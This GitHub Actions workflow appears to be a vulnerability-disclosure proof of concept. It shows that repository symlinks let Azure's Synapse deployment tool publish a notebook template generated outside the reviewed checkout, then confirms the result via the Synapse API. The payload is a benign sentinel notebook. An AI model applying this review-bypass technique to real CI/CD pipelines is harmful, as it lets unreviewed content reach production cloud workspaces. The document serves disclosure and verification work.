name: Reviewed content mismatch Synapse cloud proof

on:
  workflow_dispatch:

permissions:
  contents: read
  id-token: write

jobs:
  proof:
    runs-on: ubuntu-latest
    environment: production

    steps:
      - name: Generate trusted deployment artifact outside checkout
        shell: bash
        run: |
          set -euo pipefail

          mkdir -p "$RUNNER_TEMP/trusted"

          cat > "$RUNNER_TEMP/trusted/TemplateForWorkspace.json" <<'JSON'
          {
            "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
            "contentVersion": "1.0.0.0",
            "parameters": {
              "workspaceName": {
                "type": "string"
              }
            },
            "variables": {},
            "resources": [
              {
                "name": "[concat(parameters('workspaceName'), '/review_bypass_external_payload')]",
                "type": "Microsoft.Synapse/workspaces/notebooks",
                "apiVersion": "2021-06-01",
                "dependsOn": [],
                "properties": {
                  "folder": {
                    "name": "msrc-reviewed-content-mismatch"
                  },
                  "nbformat": 4,
                  "nbformat_minor": 2,
                  "bigDataPool": null,
                  "sessionProperties": {},
                  "metadata": {
                    "description": "MSRC_REVIEWED_CONTENT_MISMATCH_EXTERNAL_SENTINEL"
                  },
                  "cells": []
                }
              }
            ]
          }
          JSON

          cat > "$RUNNER_TEMP/trusted/TemplateParametersForWorkspace.json" <<'JSON'
          {
            "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentParameters.json#",
            "contentVersion": "1.0.0.0",
            "parameters": {
              "workspaceName": {
                "value": "${{ secrets.SYNAPSE_WORKSPACE_NAME }}"
              }
            }
          }
          JSON

          echo "[TRUSTED_GENERATED_TARGET]"
          echo "trusted_template_path=$RUNNER_TEMP/trusted/TemplateForWorkspace.json"
          echo "trusted_parameters_path=$RUNNER_TEMP/trusted/TemplateParametersForWorkspace.json"
          echo "trusted_template_sha256=$(sha256sum "$RUNNER_TEMP/trusted/TemplateForWorkspace.json" | awk '{print $1}')"
          echo "trusted_parameters_sha256=$(sha256sum "$RUNNER_TEMP/trusted/TemplateParametersForWorkspace.json" | awk '{print $1}')"
          grep -n "MSRC_REVIEWED_CONTENT_MISMATCH_EXTERNAL_SENTINEL" "$RUNNER_TEMP/trusted/TemplateForWorkspace.json"

      - name: Checkout reviewed repository
        uses: actions/checkout@v4

      - name: Prove reviewed object differs from consumed realpath bytes
        shell: bash
        run: |
          set -euo pipefail

          echo "[PATHS]"
          echo "GITHUB_WORKSPACE=$GITHUB_WORKSPACE"
          echo "RUNNER_TEMP=$RUNNER_TEMP"

          echo "[REVIEWED_REPO_OBJECT_TEMPLATE]"
          git ls-files -s synapse/TemplateForWorkspace.json
          echo "git_symlink_target_template=$(git cat-file -p :synapse/TemplateForWorkspace.json)"
          echo "git_symlink_blob_sha_template=$(git ls-files -s synapse/TemplateForWorkspace.json | awk '{print $2}')"

          echo "[REVIEWED_REPO_OBJECT_PARAMETERS]"
          git ls-files -s synapse/TemplateParametersForWorkspace.json
          echo "git_symlink_target_parameters=$(git cat-file -p :synapse/TemplateParametersForWorkspace.json)"
          echo "git_symlink_blob_sha_parameters=$(git ls-files -s synapse/TemplateParametersForWorkspace.json | awk '{print $2}')"

          TEMPLATE_REQUESTED="$GITHUB_WORKSPACE/synapse/TemplateForWorkspace.json"
          PARAMETERS_REQUESTED="$GITHUB_WORKSPACE/synapse/TemplateParametersForWorkspace.json"

          TEMPLATE_REAL="$(realpath "$TEMPLATE_REQUESTED")"
          PARAMETERS_REAL="$(realpath "$PARAMETERS_REQUESTED")"

          echo "[REALPATH]"
          echo "templateRequestedPath=$TEMPLATE_REQUESTED"
          echo "templateRealpath=$TEMPLATE_REAL"
          echo "parametersRequestedPath=$PARAMETERS_REQUESTED"
          echo "parametersRealpath=$PARAMETERS_REAL"

          case "$TEMPLATE_REAL" in
            "$GITHUB_WORKSPACE"/*)
              echo "templateRealpathWithinWorkspace=true"
              ;;
            *)
              echo "templateRealpathWithinWorkspace=false"
              ;;
          esac

          case "$PARAMETERS_REAL" in
            "$GITHUB_WORKSPACE"/*)
              echo "parametersRealpathWithinWorkspace=true"
              ;;
            *)
              echo "parametersRealpathWithinWorkspace=false"
              ;;
          esac

          echo "[HASHES]"
          echo "template_realpath_target_sha256=$(sha256sum "$TEMPLATE_REAL" | awk '{print $1}')"
          echo "parameters_realpath_target_sha256=$(sha256sum "$PARAMETERS_REAL" | awk '{print $1}')"
          grep -n "MSRC_REVIEWED_CONTENT_MISMATCH_EXTERNAL_SENTINEL" "$TEMPLATE_REAL"

      - name: Azure login using protected environment OIDC
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

      - name: Deploy Synapse artifact using built source
        shell: bash
        run: |
          set -euo pipefail

          rm -rf /tmp/Synapse-workspace-deployment
          git clone https://github.com/Azure/Synapse-workspace-deployment.git /tmp/Synapse-workspace-deployment

          cd /tmp/Synapse-workspace-deployment/build_and_deploy

          npm install
          npm run build

          export INPUT_TARGETWORKSPACENAME="${{ secrets.SYNAPSE_WORKSPACE_NAME }}"
          export INPUT_TEMPLATEFILE="$GITHUB_WORKSPACE/synapse/TemplateForWorkspace.json"
          export INPUT_PARAMETERSFILE="$GITHUB_WORKSPACE/synapse/TemplateParametersForWorkspace.json"
          export INPUT_OVERRIDEARMPARAMETERS=""
          export INPUT_ENVIRONMENT="Azure Public"
          export INPUT_RESOURCEGROUP="${{ secrets.SYNAPSE_RESOURCE_GROUP }}"
          export INPUT_SUBSCRIPTIONID="${{ secrets.AZURE_SUBSCRIPTION_ID }}"
          export INPUT_TENANTID="${{ secrets.AZURE_TENANT_ID }}"
          export INPUT_DELETEARTIFACTSNOTINTEMPLATE="false"
          export INPUT_MANAGEDIDENTITY="false"
          export INPUT_DEPLOYMANAGEDPRIVATEENDPOINT="false"
          export INPUT_FAILONMISSINGOVERRIDES="false"
          export INPUT_OPERATION="deploy"

          echo "[ACTION_SOURCE_DEPLOY]"
          echo "TemplateFile=$INPUT_TEMPLATEFILE"
          echo "ParametersFile=$INPUT_PARAMETERSFILE"
          echo "TemplateFileRealpath=$(realpath "$INPUT_TEMPLATEFILE")"
          echo "ParametersFileRealpath=$(realpath "$INPUT_PARAMETERSFILE")"

          echo "[ENTRYPOINT]"
          echo "./main.js"

          node ./main.js

      - name: Verify cloud-side Synapse artifact contains external sentinel
        shell: bash
        run: |
          set -euo pipefail

          TOKEN="$(az account get-access-token --resource https://dev.azuresynapse.net --query accessToken -o tsv)"

          STATUS="$(curl -sS -w "%{http_code}" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            "https://${{ secrets.SYNAPSE_WORKSPACE_NAME }}.dev.azuresynapse.net/notebooks/review_bypass_external_payload?api-version=2020-12-01" \
            -o synapse_artifact.json)"

          echo "[CLOUD_RESPONSE_STATUS]"
          echo "$STATUS"

          echo "[CLOUD_RESPONSE_BODY_PREVIEW]"
          head -c 4000 synapse_artifact.json || true
          echo

          echo "[CLOUD_PROOF]"
          grep -n "MSRC_REVIEWED_CONTENT_MISMATCH_EXTERNAL_SENTINEL" synapse_artifact.json
          echo "cloud_artifact_contains_external_sentinel=true"
          echo "cloud_artifact_sha256=$(sha256sum synapse_artifact.json | awk '{print $1}')"
